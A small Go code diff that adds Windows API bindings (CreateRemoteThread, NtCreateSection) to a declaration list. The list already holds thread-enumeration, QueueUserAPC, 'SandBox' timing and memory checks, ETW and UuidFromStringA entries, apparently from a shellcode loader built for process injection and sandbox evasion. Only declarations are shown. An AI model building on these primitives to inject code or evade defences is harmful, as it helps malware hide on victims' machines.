@@ -64,6 +64,7 @@ var (
 	procThread32First            = modkernel32.NewProc("Thread32First")
 	procOpenThread               = modkernel32.NewProc("OpenThread")
 	procQueueUserAPC             = modkernel32.NewProc("QueueUserAPC")
+	procCreateRemoteThread       = modkernel32.NewProc("CreateRemoteThread")
 	// SandBox
 	procGetTickCount                       = modkernel32.NewProc("GetTickCount")
 	procGetPhysicallyInstalledSystemMemory = modkernel32.NewProc("GetPhysicallyInstalledSystemMemory")
@@ -85,6 +86,7 @@ var (
 	procEtwEventWriteString         = modntdll.NewProc("EtwEventWriteString")
 	procEtwEventWriteTransfer       = modntdll.NewProc("EtwEventWriteTransfer")
 	procNtQueryInformationThread    = modntdll.NewProc("NtQueryInformationThread")
+	procNtCreateSection             = modntdll.NewProc("NtCreateSection")
 
 	// Rpcrt4
 	procUuidFromStringA = modrpcrt4.NewProc("UuidFromStringA")
